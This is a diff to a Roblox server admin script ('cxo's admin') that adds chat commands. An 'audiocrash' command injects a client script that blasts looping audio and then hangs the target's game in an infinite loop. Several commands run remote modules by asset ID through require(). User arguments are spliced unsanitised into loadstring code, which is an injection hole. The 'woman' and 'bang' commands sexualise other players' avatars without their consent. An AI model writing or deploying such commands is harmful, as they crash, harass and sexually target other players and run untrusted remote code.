+			music.Name = "cxo's admin sound"
+
+			if music.Playing == false then
+				music.Playing = true
+			end
+			
+			if music.Looped == false then
+				music.Looped = true
+			end
+
+			if music.Volume == 0 then
+				music.Volume = 1
+			end
+
+		end
+
+	end
+})
+
+addcmd({
+	Name = "unmusiclock",
+	Aliases = {"unmusicloop", "unlockmusic"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+
+		for i,v in pairs(game.Soundscape:GetChildren()) do
+			if v:IsA("Sound") and v.Name == "cxo's admin sound" then
+				v:Destroy()
+			end
+		end
+
+	end
+})
+
+addcmd({
+	Name = "volume",
+	Aliases = {"vol"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local value = table.concat(arguments, " ", 1)
+
+		if music then
+			music.Volume = value
+		end
+
+		local sound = game:GetService("Workspace"):FindFirstChild("Sound")
+		if sound then
+			sound.Volume = value
+		end
+	end
+})
+
+addcmd({
+	Name = "pitch",
+	Aliases = {},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local value = table.concat(arguments, " ", 1)
+
+		if music then
+			music.PlaybackSpeed = value
+		end
+
+		local sound = game:GetService("Workspace"):FindFirstChild("Sound")
+		if sound then
+			sound.PlaybackSpeed = value
+		end
+	end
+})
+
+addcmd({
+	Name = "skatepark",
+	Aliases = {},
+	Player = false,
+	Function = function(sender, targets, arguments)
+
+		notfi(sender, "cxo's admin", "Warning! this is laggy!")
+
+		if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Skatepark") then
+			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Skatepark"):Clone().Parent = workspace
+			return
+		end
+
+		require(106550662171689).load()
+		repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Skatepark")
+		game:GetService("ReplicatedStorage"):FindFirstChild("Skatepark"):Clone().Parent = workspace
+		game:GetService("ReplicatedStorage"):FindFirstChild("Skatepark").Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
+	
+	end
+})
+
+addcmd({
+	Name = "iyss",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+
+		if #targets > 1 then
+			notfi(sender, "cxo's admin", "Only one person can load this! once loaded use ;owner plr to give other people it!")
+		end
+
+		if iyloaded ~= nil then
+			notfi(sender, "cxo's admin", "IY has already been loaded by ".. iyloaded ..", ask them to whitelist you!")
+			return
+		end
+
+		for i, plr in ipairs(targets) do
+			require(4696373104)(plr.Name)
+			iyloaded = plr.Name
+		end
+
+	end
+})
+
+addcmd({
+	Name = "iy",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+
+			local success, err = pcall(function()
+				require(14035238433)(plr.Name)
+			end)
+
+			if err then
+				notfi(sender, "cxo's admin", "IY FE failed to load")
+			end
+
+		end
+	end
+})
+
+addcmd({
+	Name = "dodgeball",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+
+			local success, err = pcall(function()
+				require(4722391208).load(plr.Name)
+			end)
+
+			if err then
+				notfi(sender, "cxo's admin", "Failed to load dodgeball for ".. plr.Name)
+			end
+
+		end
+	end
+})
+
+addcmd({
+	Name = "partmoving",
+	Aliases = {},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local torf = table.concat(arguments, " ", 1)
+
+		if torf ~= "true" and torf ~= "false" then
+			notfi(sender, "cxo's admin", "The values are true or false! example: ".. prefix .."partmoving false")
+		end
+
+		local bool = (torf == "true")
+
+		_G.allowunpunishwelding = bool
+
+	end
+})
+
+addcmd({
+	Name = "restoremap",
+	Aliases = {"rmap"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local option = arguments[1]
+
+		if option ~= "true" and option ~= "false" then
+			notfi(sender, "cxo's admin", "The values are true or false! example: ".. prefix .."rmap false")
+		end
+
+		local bool = (option == "true")
+
+		if option == "true" then
+			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap") then
+				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap"):Clone().Parent = workspace
+				return
+			else
+				notfi(sender, "cxo's admin", "Save slot not found!")
+				return
+			end
+		else
+			if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Tabby") then
+				require(75594506017938).load()
+				game:GetService("ReplicatedStorage"):WaitForChild("Tabby").Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
+				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Tabby"):FindFirstChild("_Game").Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
+			end
+
+			local Tabby = workspace:FindFirstChild("Tabby")
+			local _Game = workspace.Terrain:FindFirstChild("_Game")
+			local BackupTabby = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Tabby")
+			local BackupGame = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("_Game")
+			
+			if not (Tabby and _Game) then
+				BackupTabby:Clone().Parent = workspace
+				BackupGame:Clone().Parent = workspace.Terrain
+				return
+			end
+			
+			local parts = {}
+
+			for i,v in ipairs(Tabby:GetDescendants()) do
+				if v:IsA("BasePart") and not game.Players:FindFirstChild(v.Name) and not v:IsA("Tool") then
+					parts[v.CFrame] = v
+				end
+			end
+			
+			for a,z in ipairs(BackupTabby:GetDescendants()) do
+				if z:IsA("BasePart") then
+					if not parts[z.CFrame] then
+						print(z.Name)
+						local cloned = z:Clone()
+						local parent = Tabby:FindFirstChild(cloned.Parent:GetFullName():gsub("^".. BackupTabby:GetFullName(), Tabby:GetFullName()), true)
+						if parent then
+							cloned.Parent = parent
+						else
+							notfi(sender, "cxo's admin", "Failed to find correct parent for: ".. cloned.Name)
+						end
+					end
+				end
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "savemap",
+	Aliases = {"smap"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+
+		if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap") then
+			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap"):ClearAllChildren()
+		end
+
+		local folder = Instance.new("Folder", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
+		folder.Name = "SavedMap"
+
+		for i, v in pairs(workspace:GetDescendants()) do
+			if v:IsA("BasePart") and not game.Players:FindFirstChild(v.Name) and not v:IsA("Tool") then
+				v:Clone().Parent = folder
+			end
+		end
+
+	end
+})
+
+addcmd({
+	Name = "loadmap",
+	Aliases = {"lmap"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap") then
+			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap"):Clone().Parent = workspace
+		else
+			notfi(sender, "cxo's admin", "No map has been saved yet! say ".. prefix .."savemap to save one!")
+		end
+	end
+})
+
+addcmd({
 	Name = "admin",
 	Aliases = {"perm"},
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
-			if not table.find(_G.permadmins, plr.Name) then
+			if table.find(_G.tempadmins, plr.Name) and not table.find(_G.permadmins, plr.Name) then
 				table.insert(_G.permadmins, plr.Name)
+			elseif not table.find(_G.permadmins, plr.Name) and not table.find(_G.tempadmins, plr.Name) then
+				table.insert(_G.permadmins, plr.Name)
+				table.insert(_G.tempadmins, plr.Name)
+			else
+				notfi(sender, "cxo's admin", plr.Name .." already has perm admin!")
 			end
 		end
 	end
@@ -1321,18 +2746,52 @@ addcmd({
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
 			if table.find(_G.permadmins, plr.Name) then
+				print(plr.Name .. " perm")
 				table.remove(_G.permadmins, table.find(_G.permadmins, plr.Name))
+			end
+			if table.find(_G.tempadmins, plr.Name) then
+				table.remove(_G.tempadmins, table.find(_G.tempadmins, plr.Name))
 			end
 		end
 	end
 })
 
 addcmd({
+	Name = "p299",
+	Aliases = {"persons"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if not table.find(_G.p299, plr.Name) then
+				table.insert(_G.p299, plr.Name)
+			else
+				notfi(sender, "cxo's admin", plr.Name .." already has person299 admin!")
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "unp299",
+	Aliases = {"unpersons"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if table.find(_G.p299, plr.Name) then
+				table.remove(_G.p299, table.find(_G.p299, plr.Name))
+			else
+				notfi(sender, "cxo's admin", plr.Name .. " Doesn't have person299!")
+			end
+		end
+	end
+})
+addcmd({
 	Name = "regen",
 	Aliases = {},
 	Player = false,
 	Function = function(sender, targets, arguments)
-		_G.tempadmins = {}
+		for i,v in pairs(_G.tempadmins) do
+			if table.find(Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, v.UserId) then return end
+			table.remove(_G.tempadmins, table.find(_G.tempadmins, v.Name))
+		end
 	end
 })
 
@@ -1351,7 +2810,7 @@ addcmd({
 			v:Kick("[SHUTDOWN] by cxo's admin | Reason: ".. reason)
 		end
 		game.Players.ChildAdded:Connect(function(cxo)
-			v:Kick("[SHUTDOWN] by cxo's admin | Reason: ".. reason)
+			cxo:Kick("[SHUTDOWN] by cxo's admin | Reason: ".. reason)
 		end)
 	end
 })
@@ -1365,10 +2824,10 @@ addcmd({
 			local clyde = Instance.new("ImageLabel", sgui)
 			local jss = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("JumpScareScript"):Clone()
 
-			clyde.Size = UDim2.new(1, 0, 1, 0)
-			clyde.Position = UDim2.new(0, 0, 0, 0)
-			clyde.BackgroundColor3 = Color3.new(0, 0, 0)
+			clyde.Size = UDim2.new(1,0,1.1,0)
+			clyde.BackgroundTransparency = 1
 			clyde.Image = "rbxassetid://15637324487"
+			clyde.ZIndex = 10
 			clyde.Visible = true
 
 			sgui.IgnoreGuiInset = true
@@ -1380,6 +2839,7 @@ addcmd({
 				task.wait(5)
 				sgui:Destroy()
 			end)()
+
 		end
 	end
 })
@@ -1453,9 +2913,13 @@ addcmd({
 					banhammer.Parent = plr.Backpack
 				end
 
-				local sound = Instance.new("Sound", workspace)
-				sound.SoundId = "http://www.roblox.com/asset/?id=10730819"
-				sound.Name = "banned"
+				local sound = banhammer:WaitForChild("Handle").Whack
+
+				if not sound then
+					local sound = Instance.new("Sound", workspace)
+					sound.SoundId = "http://www.roblox.com/asset/?id=10730819"
+					sound.Name = "banned"
+				end
 
 				banhammer.Handle.Touched:Connect(function(person)
 
@@ -1464,12 +2928,17 @@ addcmd({
 					if playuhn == plr.Name then return end
 					if playuhn == sender.Name then return end
 					if not playuh:FindFirstChild("Humanoid") then return playuh.Parent end
-					if not workspace:FindFirstChild("banned") then local sound = Instance.new("Sound", workspace); sound.SoundId = "http://www.roblox.com/asset/?id=10730819"; sound.Name = "banned" end
+					if not workspace:FindFirstChild("banned") then local sound = Instance.new("Sound", workspace)
+						sound.SoundId = "http://www.roblox.com/asset/?id=10730819" 
+						sound.Name = "banned" 
+					end
 					sound.Playing = true
 					game.Players:FindFirstChild(playuhn):Kick("You have been struck by the banhammer.")
 
 					banhammered = sound.Ended:Connect(function()
-						sound:Destroy()
+						if sound.Name == "banned" then
+							sound:Destroy()
+						end
 						banhammered:Disconnect()
 					end)
 
@@ -1485,11 +2954,16 @@ addcmd({
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
 			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then
+				local ls = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("OrbScript"):Clone()
+				ls.Parent = plr.Character
+
+				repeat task.wait() until ls.Parent == plr.Character
+				
 				local orb = Instance.new("Part", plr.Character)
 				local weld = Instance.new("Weld", orb)
-				local ls = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("OrbScript"):Clone()
 				local godmode = Instance.new("ForceField", plr.Character)
 
+				ls.Parent = plr.Character
 				godmode.Visible = false
 
 				plr.Character.Humanoid.MaxHealth = math.huge
@@ -1498,17 +2972,16 @@ addcmd({
 				weld.Part0 = orb
 				weld.Part1 = plr.Character:FindFirstChild("Torso")
 
-				orb.CanCollide = true
+				orb.Massless = true
 				orb.CastShadow = true
 				orb.Size = Vector3.new(10, 10, 10)
 				orb.Shape = Enum.PartType.Ball
 				orb.Transparency = 0.7
 				orb.Material = Enum.Material.Neon
 				orb.BrickColor = BrickColor.new("Really red")
+				orb.Locked = true
+				orb.CanCollide = true
 				orb.Name = "ff"
-
-				repeat task.wait(0.2) until orb.CanCollide == true
-				ls.Parent = plr.Character
 			end
 		end
 	end
@@ -1534,7 +3007,7 @@ addcmd({
 	Aliases = {"hamster", "ball"},
 	Function = function(sender, targets, arguments)
 
-		if #targets ~= 1 then
+		if #targets > 1 then
 			notfi(sender, "cxo's admin", "Too many targets!")
 		end
 
@@ -1576,6 +3049,7 @@ addcmd({
 						part.Transparency = 0.8
 						part.Anchored = false
 						part.CanCollide = true
+						part.BrickColor = BrickColor.new("Institutional white")
 						part.Position = center.Position + Vector3.new(x, y, z)
 
 						local normal = Vector3.new(x, y, z).Unit
@@ -1587,7 +3061,10 @@ addcmd({
 						weld.Parent = center
 					end
 				end
-				plr.Character.PrimaryPart.Position = center.Position
+				for i = 1,25 do
+					plr.Character.PrimaryPart.Position = center.Position
+					task.wait(0.005)
+				end
 			end
 		end
 	end
@@ -1644,6 +3121,283 @@ addcmd({
 })
 
 addcmd({
+	Name = "audiocrash",
+	Aliases = {"audioc"},
+	Function = function(sender, targets, arguments)
+		local audio = arguments[1]
+
+		for i, plr in ipairs(targets) do
+
+			if audio == "" then
+				local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+				local utilities = game:GetService("ServerScriptService").goog.Utilities
+				local loa = utilities:FindFirstChild("loadstring")
+				
+				if loa then
+					loa = loa:Clone()
+				else
+					loa = utilities:FindFirstChild("Loadstring")
+					if loa then
+						loa = loa:Clone()
+					end
+				end
+				
+				if not loa then
+					warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+				end
+				loa.Parent = scr
+				scr:WaitForChild("Exec").Value = [[
+				
+				local sound = Instance.new("Sound", workspace)
+				sound.SoundId = "rbxassetid://401117743"
+				sound.Volume = 1
+				sound.Looped = true
+				sound.Name = "cxo's admin train sound"
+				sound:Play()
+
+				repeat task.wait() until sound and sound.TimePosition ~= 0
+				while true do end
+
+				]]
+				if plr and plr.Character then
+					scr.Parent = plr.Character
+				else
+					if plr then
+						scr.Parent = plr:WaitForChild("PlayerGui")
+					end
+				end
+				scr.Name = "LoudTrain"
+				scr.Enabled = true
+			elseif audio == "n" then
+				local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+				local utilities = game:GetService("ServerScriptService").goog.Utilities
+				local loa = utilities:FindFirstChild("loadstring")
+				
+				if loa then
+					loa = loa:Clone()
+				else
+					loa = utilities:FindFirstChild("Loadstring")
+					if loa then
+						loa = loa:Clone()
+					end
+				end
+				
+				if not loa then
+					warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+				end
+				loa.Parent = scr
+				scr:WaitForChild("Exec").Value = [[
+				
+				local sound = Instance.new("Sound", workspace)
+				sound.SoundId = "rbxassetid://140555145345310"
+				sound.Volume = 10
+				sound.Looped = true
+				sound.Name = "cxo's admin train sound"
+				sound:Play()
+
+				repeat task.wait() until sound and sound.TimePosition ~= 0
+				while true do end
+
+				]]
+				if plr and plr.Character then
+					scr.Parent = plr.Character
+				else
+					if plr then
+						scr.Parent = plr:WaitForChild("PlayerGui")
+					end
+				end
+				scr.Name = "FunnyAudio"
+				scr.Enabled = true
+			else
+				local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+				local utilities = game:GetService("ServerScriptService").goog.Utilities
+				local loa = utilities:FindFirstChild("loadstring")
+				
+				if loa then
+					loa = loa:Clone()
+				else
+					loa = utilities:FindFirstChild("Loadstring")
+					if loa then
+						loa = loa:Clone()
+					end
+				end
+				
+				if not loa then
+					warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+				end
+				loa.Parent = scr
+				scr:WaitForChild("Exec").Value = string.format([[
+				
+				local sound = Instance.new("Sound", workspace)
+				sound.SoundId = "rbxassetid://".. %s
+				sound.Volume = 1
+				sound.Looped = true
+				sound.Name = "cxo's admin train sound"
+				sound:Play()
+
+				repeat task.wait() until sound.TimePosition ~= 0
+				while true do end
+
+				]], audio)
+				if plr and plr.Character then
+					scr.Parent = plr.Character
+				else
+					if plr then
+						scr.Parent = plr:WaitForChild("PlayerGui")
+					end
+				end
+				scr.Name = "Audio"
+				scr.Enabled = true
+			end
+		end 
+	end
+})
+
+addcmd({
+	Name = "clientsound",
+	Aliases = {"clientaudio"},
+	Function = function(sender, targets, arguments)
+		local audio = arguments[1]
+
+		for i, plr in ipairs(targets) do
+
+			if audio == "n" then
+				audio = "140555145345310"
+			elseif audio == "t" then
+				audio = "401117743"
+			end
+
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = string.format([[
+
+			local sound = Instance.new("Sound", workspace)
+			sound.SoundId = "rbxassetid://".. %s
+			sound.Volume = 1
+			sound.Looped = true
+			sound.Name = "cxo's admin client sound"
+			sound:Play()
+
+			]], audio)
+			if plr and plr.Character then
+				scr.Parent = plr.Character
+			else
+				if plr then
+					scr.Parent = plr:WaitForChild("PlayerGui")
+				end
+			end
+			scr.Name = "Audio"
+			scr.Enabled = true
+		end 
+	end
+})
+
+addcmd({
+	Name = "unclientsound",
+	Aliases = {"unclientaudio"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = [[
+
+				for i,v in pairs(workspace:GetChildren()) do
+					if v:IsA("Sound") and v.Name == "cxo's admin client sound" then
+						v:Destroy()
+					end
+				end
+
+			]]
+			if plr and plr.Character then
+				scr.Parent = plr.Character
+			else
+				if plr then
+					scr.Parent = plr:WaitForChild("PlayerGui")
+				end
+			end
+			scr.Name = "Audio"
+			scr.Enabled = true
+		end 
+	end
+})
+
+addcmd({
+	Name = "clientsoundvolume",
+	Aliases = {"clientaudiovolume", "csv", "cav"},
+	Function = function(sender, targets, arguments)
+		local volume = arguments[1]
+
+		for i, plr in ipairs(targets) do
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = string.format([[
+
+				for i,v in pairs(workspace:GetChildren()) do
+					if v:IsA("Sound") and v.Name == "cxo's admin client sound" then
+						v.Volume = %s
+					end
+				end
+				
+			]], volume)
+			if plr and plr.Character then
+				scr.Parent = plr.Character
+			else
+				if plr then
+					scr.Parent = plr:WaitForChild("PlayerGui")
+				end
+			end
+			scr.Name = "Audio"
+			scr.Enabled = true
+		end 
+	end
+})
+
+addcmd({
 	Name = "msg",
 	Aliases = {"message"},
 	Function = function(sender, targets, arguments)
@@ -1685,7 +3439,7 @@ addcmd({
 				message.Parent = plr.PlayerGui
 
 				task.spawn(function()
-					task.wait(5)
+					task.wait(3.5)
 					message:Destroy()
 				end)
 
@@ -1714,11 +3468,16 @@ addcmd({
 	Aliases = {"gravitygun"},
 	Function = function(sender, targets, arguments)
 
-		if #targets ~= 1 then
+		if #targets > 1 then
 			notfi(sender, "cxo's admin", "Too many targets!")
 		end
 
 		for i, plr in ipairs(targets) do
+
+			if not table.find(gmodded, plr.UserId) then
+				table.insert(gmodded, plr.UserId)
+			end
+
 			local success, gear = pcall(function()
 				return game:GetService("InsertService"):LoadAsset(2136443074)
 			end)
@@ -1734,14 +3493,36 @@ addcmd({
 					local gmodremote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
 					gmodremote.Name = "cxo's gmod remote"
 				end
+
+				lelnobypassforu[plr.UserId] = gmod:WaitForChild("RemoteScript").Destroying:Connect(function()
+					if table.find(gmodded, plr.UserId) then
+						table.remove(gmodded, table.find(gmodded, plr.UserId))
+					end
+					lelnobypassforu[plr.UserId]:Disconnect()
+				end)
+
 			end
 		end
 	end
 })
 
 addcmd({
-	Name = "peep",
-	Aliases = {"pp"},
+	Name = "test",
+	Aliases = {},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		if sender.UserId ~= 3222470105 then
+			notfi(sender, "cxo's admin", "This is a test command that is only useable by cxo!")
+			return
+		end
+
+		
+	end
+})
+
+addcmd({
+	Name = "man",
+	Aliases = {"pp", "peep"},
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
 			if plr.Character and plr.Character:FindFirstChild("Torso") then
@@ -1824,17 +3605,269 @@ addcmd({
 })
 
 addcmd({
+	Name = "woman",
+	Aliases = {"girl"},
+	Function = function(sender, targets, arguments) -- took iy SS code for this one
+		for i, plr in ipairs(targets) do
+			if plr.Character and plr.Character:FindFirstChild("Torso") then
+
+				local V1 = plr.Character:FindFirstChild("Torso")
+
+				function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
+					local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
+					if (zCoco) then
+						funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
+					else
+						funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
+					end
+					return funcw
+				end
+
+				local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = plr.Character.Torso.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
+				local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
+				fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
+				local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = plr.Character.Torso.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
+				local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
+				fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
+				local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
+				local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
+				fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
+				local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
+				local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
+				fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
+				local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = plr.Character.Torso.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
+				local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
+				fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
+				local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = plr.Character.Torso.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
+				local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
+				fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)
+
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "bang",
+	Aliases = {},
+	Player = false,
+	Function = function(sender, targets, arguments) -- took iy SS code for this one
+		local arg, plr
+    
+		if arguments[2] then
+			arg = arguments[1]
+			plr = arguments[2]
+		elseif arguments[1] then
+			arg = sender.Name
+			plr = arguments[1]
+		else
+			notfi(sender, "cxo's admin", "You need to specify at least one player!")
+			return
+		end
+
+		if arg == "me" then
+			arg = sender.Name
+		end
+
+		local argt = p(arg, sender)
+		local argt2 = p(plr, sender)
+
+		if #argt2 <= 0 then
+			V1 = workspace:FindFirstChild(plr)
+			if V1 then
+				V1 = V1.Torso
+			else
+				notfi(sender, "cxo's admin", "Invalid user / model!")
+				return
+			end
+		else
+			V1 = argt2[1]
+
+			if V1.Character and V1.Character:FindFirstChild("Torso") and V1.Character:FindFirstChild("Humanoid") then
+				V1 = argt2[1].Character:FindFirstChild("Torso")
+			else
+				notfi(sender, "cxo's admin", V1.Name .." Doesn't have a Torso!")
+				return
+			end
+		end
+
+		if argt[1].Character and argt[1].Character:FindFirstChild("Torso") and argt[1].Character:FindFirstChild("HumanoidRootPart") then
+
+			local P1 = argt[1].Character:FindFirstChild("Torso")
+
+			if #argt2 <= 0 and workspace:FindFirstChild(plr) then
+				workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
+				workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart").Massless = true
+			else
+				V1.Parent:FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
+				V1.Parent:FindFirstChild("HumanoidRootPart").Massless = true
+			end
+
+			function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
+				local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
+				if (zCoco) then
+					funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
+				else
+					funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
+				end
+				return funcw
+			end
+
+			local WE = nil
+
+			V1.Parent:FindFirstChild("Humanoid").PlatformStand = true
+			P1['Left Shoulder']:Destroy() local LA1 = Instance.new('Weld', P1) LA1.Part0 = P1 LA1.Part1 = P1.Parent['Left Arm'] LA1.C0 = CFrame.new(-1.5, 0, 0) LA1.Name = 'Left Shoulder'
+			P1['Right Shoulder']:Destroy() local RS1 = Instance.new('Weld', P1) RS1.Part0 = P1 RS1.Part1 = P1.Parent['Right Arm'] RS1.C0 = CFrame.new(1.5, 0, 0) RS1.Name = 'Right Shoulder'
+			V1['Left Shoulder']:Destroy() local LS2 = Instance.new('Weld', V1) LS2.Part0 = V1 LS2.Part1 = V1.Parent['Left Arm'] LS2.C0 = CFrame.new(-1.5, 0, 0) LS2.Name = 'Left Shoulder'
+			V1['Right Shoulder']:Destroy() local RS2 = Instance.new('Weld', V1) RS2.Part0 = V1 RS2.Part1 = V1.Parent['Right Arm'] RS2.C0 = CFrame.new(1.5, 0, 0) RS2.Name = 'Right Shoulder'
+			V1['Left Hip']:Destroy() local LH2 = Instance.new('Weld', V1) LH2.Part0 = V1 LH2.Part1 = V1.Parent['Left Leg'] LH2.C0 = CFrame.new(-0.5, -2, 0) LH2.Name = 'Left Hip'
+			V1['Right Hip']:Destroy() local RH2 = Instance.new('Weld', V1) RH2.Part0 = V1 RH2.Part1 = V1.Parent['Right Leg'] RH2.C0 = CFrame.new(0.5, -2, 0) RH2.Name = 'Right Hip'
+
+			local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = V1.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
+			local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
+			fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
